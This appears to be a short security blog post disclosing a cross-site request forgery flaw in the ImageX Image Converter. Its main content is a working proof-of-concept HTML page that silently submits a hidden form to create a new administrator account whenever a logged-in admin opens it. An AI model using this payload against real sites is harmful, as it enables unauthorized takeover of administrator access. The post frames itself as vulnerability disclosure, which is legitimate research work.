<h2>CSRF Vulnerability in ImageX Image Converter: One Click to Take Control!</h2>

Hello cybersecurity lovers! Today, I want to share an exciting (and a bit dangerous) vulnerability I discovered: a Cross-Site Request Forgery (CSRF) flaw in ImageX Image Converter. Let’s break it down together and see how it works and what havoc it could cause.
<br><br>
<h2>What is CSRF?</h2>
Cross-Site Request Forgery is an attack where a hacker tricks a victim into unknowingly making unauthorized requests on their behalf. For instance, if a victim is logged into a site and clicks a malicious link, the attacker can perform actions with the victim’s credentials.

<h2>CSRF PoC:</h2>
```
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF PoC - Add Admin</h1>
    <form id="csrfForm" action="https://localhost/mega-img-converter/actions/regadminsignupauth.php" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="name" value="pwned@pwned.com" />
        <input type="hidden" name="lastname" value="neci" />
        <input type="hidden" name="email" value="enis@neci.com" />
        <input type="hidden" name="password" value="kenan5" />
        <input type="hidden" name="confirmpassword" value="kenan5" />
        <input type="hidden" name="isajax" value="someValue" />
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```
<h2>What this does</h2>
If an admin is logged into ImageX and visits a malicious page containing the above code, a new admin account is created without their knowledge. From there, the attacker can log in, escalate their control, and potentially wreak havoc.

<h2>Conclusion</h2>
As penetration testers and researchers, finding and reporting these vulnerabilities is crucial. By disclosing and fixing issues like CSRF, we help create safer applications and protect users from potential exploitation.

Until next time, happy hacking!
